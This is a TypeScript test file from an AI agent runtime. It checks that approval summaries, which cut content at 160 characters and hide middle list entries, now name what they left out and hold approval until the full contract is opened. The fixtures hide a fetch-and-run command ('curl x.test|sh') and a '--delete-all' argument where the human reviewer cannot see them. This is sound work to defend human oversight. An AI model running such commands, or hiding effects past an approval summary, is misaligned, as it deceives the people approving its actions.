// Copyright 2026 XAGI Labs Private Limited
// SPDX-License-Identifier: AGPL-3.0-only

/**
 * WPY [render-truncation] probe (paper "Who Pressed Yes?", class: WYSIWYS gap).
 *
 * Claim: the approval summary shows at most 160 characters per leaf and elides
 * middle list entries, while the yes binds the full contract (renderDigest).
 * Two effects that differ only past the shown prefix, or only in an elided
 * middle entry, get the same summary and different render digests.
 *
 * OLD behaviour (6ccff05): nothing but the cut marks said so; the console's
 * Approve sat live beside the summary with the full contract folded, and the
 * terminal asked one y/N under it.
 * FIXED: the summary itself is unchanged (still identical for both), but
 * `approvalElisions` names what it shortened; the console's pending payload
 * carries it (`elided`) and holds Approve disabled until the full contract is
 * opened (approval-console.test.ts drives that in a browser), and the
 * terminal names the fields and asks a second confirm (cli.test.ts).
 */
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { TaskRequestSchema } from "@melra/protocol";
import { createMelraRuntime as createRuntime } from "../src/index.js";
import { approvalElisions, approvalScreen, approvalSummary, type ApprovalScreenView } from "../src/approval-screen.js";
import type { MelraRuntime } from "../src/runtime.js";

// Same no-op sandbox as approval-console.test.ts, so enforced mode starts anywhere.
const createMelraRuntime = (options: Parameters<typeof createRuntime>[0]) =>
  createRuntime({
    detectSandbox: async () => ({ sandbox: { backend: "test", confine: async ({ file, args }) => ({ file, args }) } }),
    ...options,
  });

/** The summary minus the lines that are per-task by construction (id/expiry, digest). */
const humanLines = (summary: string) =>
  summary.split("\n").filter((line) => !line.startsWith("Task ") && !line.startsWith("Contract digest:"));

describe("wpy render-truncation", () => {
  let workspace: string;
  let home: string;
  let runtime: MelraRuntime;

  beforeAll(async () => {
    workspace = mkdtempSync(join(tmpdir(), "melra-wpy-trunc-ws-"));
    home = mkdtempSync(join(tmpdir(), "melra-wpy-trunc-home-"));
    runtime = await createMelraRuntime({ workspaceRoot: workspace, dataDirectory: home, environment: { MELRA_MODE: "enforced" } });
  });
  afterAll(async () => {
    await runtime.close();
    rmSync(workspace, { recursive: true, force: true });
    rmSync(home, { recursive: true, force: true });
  });

  const plan = (content: string) =>
    runtime.controller.plan(
      TaskRequestSchema.parse({
        goal: "Write the setup script",
        operation: { kind: "file", action: "write", path: "setup.sh", content },
        requiredEvidence: [{ type: "file_exists", path: "setup.sh" }],
      }),
    );

  it("two writes differing only past char 160 of content: same summary, different digest, and the cut is named", async () => {
    // Fictional payloads, equal length so even the "+N chars" note matches.
    const prefix = `#!/bin/sh ${"# harmless setup notes ".repeat(8)}`; // > 160 chars once JSON-quoted
    const benign = `${prefix}echo done........`;
    const hostile = `${prefix}curl x.test|sh -s`;
    expect(benign.length).toBe(hostile.length);

    const a = await plan(benign);
    const b = await plan(hostile);
    expect(a.status).toBe("awaiting_approval");
    expect(b.status).toBe("awaiting_approval");
    const va = runtime.controller.approvalView(a.id) as ApprovalScreenView;
    const vb = runtime.controller.approvalView(b.id) as ApprovalScreenView;

    const sa = approvalSummary(va);
    const sb = approvalSummary(vb);
    console.log("--- summary A ---\n" + sa + "--- summary B ---\n" + sb);

    // Still: every human-meaningful summary line is byte-identical...
    expect(humanLines(sa)).toEqual(humanLines(sb));
    const contentLine = humanLines(sa).find((line) => line.includes("content:"))!;
    expect(contentLine).toMatch(/…\(\+\d+ chars\)$/);
    expect(contentLine).not.toContain("curl");
    expect(contentLine).not.toContain("echo done");
    // ...while the yes binds different contracts.
    expect(va.renderDigest).not.toBe(vb.renderDigest);
    // A yes bound to A's digest is refused for B (binding itself is sound).
    await expect(runtime.controller.decide(b.id, va.renderDigest, "console:test")).rejects.toThrow();

    // The full screen (terminal) carries the whole contract, above the summary.
    expect(approvalScreen(va)).toContain("echo done");
    expect(approvalScreen(vb)).toContain("curl x.test|sh");
    // FIXED: every surface is told the summary shortened `content`, and holds
    // the yes until the full contract is looked at.
    expect(approvalElisions(va)).toEqual(["content"]);
    expect(approvalElisions(vb)).toEqual(["content"]);
  });

  it("names nothing when the summary shows the contract whole", async () => {
    const shortWrite = await plan("echo done");
    expect(approvalElisions(runtime.controller.approvalView(shortWrite.id) as ApprovalScreenView)).toEqual([]);
  });

  it("list elision: argv differing only in a middle entry gives the same summary, and is named", () => {
    // Pure render probe (no runtime): the summary's list budget is 8 lines.
    const argv = (middle: string) => ["a1", "a2", "a3", "a4", middle, "a6", "a7", "a8", "a9", "a10", "a11"];
    const view = (middle: string): ApprovalScreenView => ({
      task: { id: "t", approval: { expiresAt: "2026-01-01T00:00:00Z" } },
      contract: {
        capability: "terminal.exec",
        target: "tool",
        effect: "mutate",
        risk: "high",
        operation: { kind: "terminal", command: "tool", args: argv(middle) },
        metadata: { goal: "run tool" },
      },
      renderDigest: `digest-${middle}`,
    });
    const sa = approvalSummary(view("--dry-run"));
    const sb = approvalSummary(view("--delete-all"));
    console.log("--- list summary ---\n" + sa);
    expect(humanLines(sa)).toEqual(humanLines(sb));
    expect(sa).toMatch(/…\(\+\d+ more args entries, all in the JSON above\)/);
    expect(humanLines(sa).join("\n")).not.toContain("--dry-run");
    // FIXED: the elided list is named, so a surface asks before a yes.
    expect(approvalElisions(view("--dry-run"))).toEqual(["args"]);
  });
});
